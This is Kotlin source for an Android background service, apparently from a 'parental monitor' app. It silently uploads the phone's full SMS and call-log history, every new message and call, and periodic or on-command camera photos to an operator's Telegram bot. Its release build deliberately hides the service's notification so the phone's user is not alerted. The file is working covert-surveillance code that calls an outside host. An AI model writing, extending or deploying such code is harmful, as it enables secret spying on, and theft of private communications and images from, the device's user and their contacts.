package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import com.redeye.parentalmonitor.utils.TimeFmt
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null
    private var commandJob: Job? = null

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        const val ACTION_STOP_MONITORING = "STOP_MONITORING"
        private const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        preferencesManager = PreferencesManager(this)
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue(this)
        cameraService = CameraService(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_MONITORING -> startMonitoring()
            ACTION_STOP_MONITORING -> stopMonitoring()
        }
        return START_STICKY
    }

    private fun startMonitoring() {
        android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")

        // Cancel any previous loops so a restart never duplicates work
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        
        // In RELEASE mode, make notification invisible/minimal
        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle("")
                .setContentText("")
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        // Start foreground with camera service type for Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID, 
                notificationBuilder.build(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notificationBuilder.build(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notificationBuilder.build())
        }
        android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")

        // Send initial data only once per device (never re-dump history on reboot)
        if (!preferencesManager.initialSyncDone) {
            serviceScope.launch {
                android.util.Log.i("MonitoringService", "Starting initial data collection...")
                sendInitialData()
                android.util.Log.i("MonitoringService", "Initial data collection completed")
            }
        }

        // Start periodic monitoring (honors the user-configured interval)
        monitoringJob = serviceScope.launch {
            while (isActive) {
                try {
                    checkAndSendNewData()
                    delay(syncIntervalMillis())
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                    e.printStackTrace()
                }
            }
        }
        android.util.Log.d("MonitoringService", "Monitoring loop started")
        
        // Start camera monitoring (user-configured interval)
        cameraJob = serviceScope.launch {
            while (isActive) {
                try {
                    captureAndSendPhoto()
                    delay(cameraIntervalMillis())
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop", e)
                    e.printStackTrace()
                }
            }
        }
        android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
        startCommandPolling()
    }

    private fun cameraIntervalMillis(): Long {
        return preferencesManager.cameraInterval.coerceIn(1, 60) * 60_000L
    }

    // ═══════════════════════════════════════════════════════════
    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
    // ═══════════════════════════════════════════════════════════

    private fun startCommandPolling() {
        commandJob = serviceScope.launch {
            while (isActive) {
                try {
                    pollTelegramCommands()
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error polling commands", e)
                }
                delay(15_000)
            }
        }
    }

    private suspend fun pollTelegramCommands() {
        val botToken = preferencesManager.botToken
        val chatId = preferencesManager.chatId
        if (botToken.isEmpty() || chatId.isEmpty()) return

        val offset = preferencesManager.lastUpdateId + 1
        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"

        val response = try {
            TelegramClient.api.getUpdates(url)
        } catch (e: Exception) {
            return
        }
        if (!response.isSuccessful || response.body()?.ok != true) return

        val updates = response.body()?.result ?: return
        for (update in updates) {
            if (update.updateId > preferencesManager.lastUpdateId) {
                preferencesManager.lastUpdateId = update.updateId
            }
            val message = update.message ?: continue
            if (message.chat.id.toString() != chatId) continue
            val command = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
            if (!command.startsWith("/")) continue
            handleTelegramCommand(command)
        }
    }

    private suspend fun handleTelegramCommand(command: String) {
        when (command) {
            "/photo" -> {
                sendToTelegram("📸 Taking photo now…")
                captureAndSendPhoto()
            }
            "/status" -> {
                val lastSync = preferencesManager.lastSyncTime
                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                sendToTelegram(
                    buildString {
                        appendLine("📊 <b>Status</b>")
                        appendLine("Monitoring: ON")
                        appendLine("Last sync: $lastSyncStr")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
                        appendLine("Photo interval: ${preferencesManager.cameraInterval} min")
                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                    }
                )
            }
            "/help", "/start" -> {
                sendToTelegram(
                    buildString {
                        appendLine("🤖 <b>Commands</b>")
                        appendLine("/photo - take a photo now")
                        appendLine("/status - show monitoring status")
                        appendLine("/help - show this list")
                    }
                )
            }
            else -> { /* ignore unknown input to avoid reply loops */ }
        }
    }

    private suspend fun sendInitialData() {
        try {
            android.util.Log.i("MonitoringService", "Collecting SMS history...")
            // Get all history first
            val allSms = smsRepository.getAllSms()
            android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
            
            android.util.Log.i("MonitoringService", "Collecting call history...")
            val allCalls = callLogRepository.getAllCalls()
            android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")

            // Update last synced IDs
            if (allSms.isNotEmpty()) {
                val maxSmsId = allSms.maxOf { it.id }
                preferencesManager.lastSmsId = maxSmsId
                android.util.Log.d("MonitoringService", "Last SMS ID set to: $maxSmsId")
            }

            if (allCalls.isNotEmpty()) {
                val maxCallDate = allCalls.maxOf { it.date }
                preferencesManager.lastCallTimestamp = maxCallDate
                android.util.Log.d("MonitoringService", "Last call timestamp set to: $maxCallDate")
            }

            // Send start message
            android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Monitoring started</b>")
                appendLine()
                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Found on device:")
                appendLine("• SMS: ${allSms.size}")
                appendLine("• Calls: ${allCalls.size}")
                appendLine()
                appendLine("Sending history...")
            }
            sendToTelegram(startMessage)
            delay(2000) // Wait 2 seconds before sending history

            // Send all SMS history in chunks
            if (allSms.isNotEmpty()) {
                val chunks = allSms.chunked(10)
                android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
                chunks.forEachIndexed { index, chunk ->
                    android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { sms ->
                            appendLine("📞 Number: ${sms.address}")
                            val body = sms.body.take(200) // Limit SMS body to 200 chars
                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Type: ${sms.getTypeString()}")
                            appendLine("⏰ Time: ${formatDate(sms.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    // Check message length (Telegram limit: 4096)
                    if (message.length > 4000) {
                        android.util.Log.w("MonitoringService", "Message too long (${message.length}), splitting...")
                        sendToTelegram(message.take(4000) + "\n\n... (message truncated)")
                    } else {
                        sendToTelegram(message)
                    }
                    delay(1000) // Wait 1 second between messages
                }
                android.util.Log.i("MonitoringService", "All SMS chunks sent")
            }

            // Send all call history in chunks
            if (allCalls.isNotEmpty()) {
                val chunks = allCalls.chunked(10)
                android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
                chunks.forEachIndexed { index, chunk ->
                    android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { call ->
                            appendLine("📱 Number: ${call.number}")
                            if (call.name != null) {
                                appendLine("👤 Name: ${call.name}")
                            }
                            appendLine("🔄 Type: ${call.getTypeString()}")
                            appendLine("⏱️ Duration: ${call.getDurationString()}")
                            appendLine("⏰ Time: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    // Check message length
                    if (message.length > 4000) {
                        android.util.Log.w("MonitoringService", "Message too long (${message.length}), truncating...")
                        sendToTelegram(message.take(4000) + "\n\n... (message truncated)")
                    } else {
                        sendToTelegram(message)
                    }
                    delay(1000) // Wait 1 second between messages
                }
                android.util.Log.i("MonitoringService", "All call chunks sent")
            }

            preferencesManager.initialSyncDone = true

            // Final message
            android.util.Log.i("MonitoringService", "Sending completion message...")
            val completeMessage = buildString {
                appendLine("✅ <b>History sync complete</b>")
                appendLine()
                appendLine("From now on, only new SMS and calls will be sent.")
            }
            sendToTelegram(completeMessage)
            android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun checkAndSendNewData() {
        try {
            // Check for new SMS
            val lastSmsId = preferencesManager.lastSmsId
            val newSms = smsRepository.getNewSms(lastSmsId)
            
            if (newSms.isNotEmpty()) {
                val message = formatSmsMessage(newSms)
                sendToTelegram(message)
                
                val maxId = newSms.maxOf { it.id }
                preferencesManager.lastSmsId = maxId
            }

            // Check for new calls
            val lastCallTimestamp = preferencesManager.lastCallTimestamp
            val newCalls = callLogRepository.getNewCalls(lastCallTimestamp)
            
            if (newCalls.isNotEmpty()) {
                val message = formatCallMessage(newCalls)
                sendToTelegram(message)
                
                val maxTimestamp = newCalls.maxOf { it.date }
                preferencesManager.lastCallTimestamp = maxTimestamp
            }

            if (newSms.isNotEmpty() || newCalls.isNotEmpty()) {
                preferencesManager.lastSyncTime = System.currentTimeMillis()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>New SMS (${smsList.size})</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Number: ${sms.address}")
                val body = sms.body.take(200) // Limit to 200 chars
                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Type: ${sms.getTypeString()}")
                appendLine("⏰ Time: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>New calls (${callList.size})</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Number: ${call.number}")
                if (call.name != null) {
                    appendLine("👤 Name: ${call.name}")
                }
                appendLine("🔄 Type: ${call.getTypeString()}")
                appendLine("⏱️ Duration: ${call.getDurationString()}")
                appendLine("⏰ Time: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private suspend fun sendToTelegram(message: String) {
        try {
            // Validate message length (Telegram max: 4096)
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, truncating")
                val truncated = message.take(4000) + "\n\n... (message truncated)"
                sendToTelegram(truncated)
                return
            }
            
            val botToken = preferencesManager.botToken
            val chatId = preferencesManager.chatId

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
                return
            }

            // Check if network is available
            val hasNetwork = NetworkUtils.isNetworkAvailable(this)
            android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                // No internet, add to queue
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                messageQueue.addMessage(message)
                return
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML"
            )

            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            val response = TelegramClient.api.sendMessage(url, telegramMessage)

            if (response.isSuccessful && response.body()?.ok == true) {
                android.util.Log.i("MonitoringService", "✓ Message sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
            } else if (response.code() == 429) {
                val retryAfter = parseRetryAfter(response.errorBody()?.string())
                android.util.Log.w("MonitoringService", "Rate limited, retrying after ${retryAfter}s")
                kotlinx.coroutines.delay(retryAfter * 1000L)
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                messageQueue.addMessage(message)
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${e.message}", e)
            e.printStackTrace()
            // Network error, add to queue
            messageQueue.addMessage(message)
            // Schedule retry when network is available
            MessageScheduler.scheduleMessageSend(this)
        }
    }

    private fun syncIntervalMillis(): Long {
        return preferencesManager.syncInterval.coerceIn(1, 1440) * 60_000L
    }

    private fun formatDate(timestamp: Long): String {
        return TimeFmt.full(timestamp)
    }

    private fun parseRetryAfter(errorBody: String?): Long {
        return try {
            com.google.gson.JsonParser.parseString(errorBody)
                ?.asJsonObject
                ?.getAsJsonObject("parameters")
                ?.get("retry_after")
                ?.asLong
                ?.coerceIn(1, 300) ?: 5L
        } catch (e: Exception) {
            5L
        }
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private suspend fun captureAndSendPhoto() {
        withContext(Dispatchers.Main) {
            try {
                android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
                
                cameraService.capturePhoto(
                    onPhotoTaken = { photoFile ->
                        serviceScope.launch {
                            sendPhotoToTelegram(photoFile)
                        }
                    },
                    onError = { exception ->
                        android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                        serviceScope.launch {
                            notifyCameraFailure(exception.message ?: "unknown error")
                        }
                    }
                )
            } catch (e: Exception) {
                android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
            }
        }
    }
    
    private suspend fun notifyCameraFailure(reason: String) {
        try {
            val now = System.currentTimeMillis()
            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            val hint = if (!hasCameraPermission()) {
                "Camera permission is missing — open Setup and grant it."
            } else {
                "The camera may be in use by another app."
            }
            sendToTelegram("⚠️ Photo capture failed: $reason. $hint")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending camera notice", e)
        }
    }

    private suspend fun notifyPhotoSendFailure(detail: String) {
        try {
            val now = System.currentTimeMillis()
            if (now - preferencesManager.lastCameraErrorNotice < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending upload notice", e)
        }
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private suspend fun sendPhotoToTelegram(photoFile: File) {
        if (sendPhotoFile(photoFile)) {
            flushPendingPhotos()
        } else {
            prunePhotoCache()
        }
    }

    private suspend fun sendPhotoFile(photoFile: File): Boolean {
        try {
            if (!NetworkUtils.isNetworkAvailable(this)) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return false
            }

            val botToken = preferencesManager.botToken
            val chatId = preferencesManager.chatId

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                return false
            }

            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())

            val timestamp = TimeFmt.full(System.currentTimeMillis())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())

            val url = "https://api.telegram.org/bot$botToken/sendPhoto"

            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)

            if (response.isSuccessful && response.body()?.ok == true) {
                android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                photoFile.delete()
                return true
            }
            val errorBody = try {
                response.errorBody()?.string()?.take(200) ?: ""
            } catch (e: Exception) {
                ""
            }
            if (response.code() == 429) {
                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
            }
            return false
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
            return false
        }
    }

    private suspend fun flushPendingPhotos(max: Int = 3) {
        val pending = try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() }?.take(max) ?: return
        } catch (e: Exception) {
            return
        }
        for (file in pending) {
            if (!sendPhotoFile(file)) break
            kotlinx.coroutines.delay(1000)
        }
        prunePhotoCache()
    }

    private fun prunePhotoCache(maxKept: Int = 20) {
        try {
            val photos = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() } ?: return
            photos.dropLast(maxKept).forEach { it.delete() }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error pruning photo cache", e)
        }
    }
}

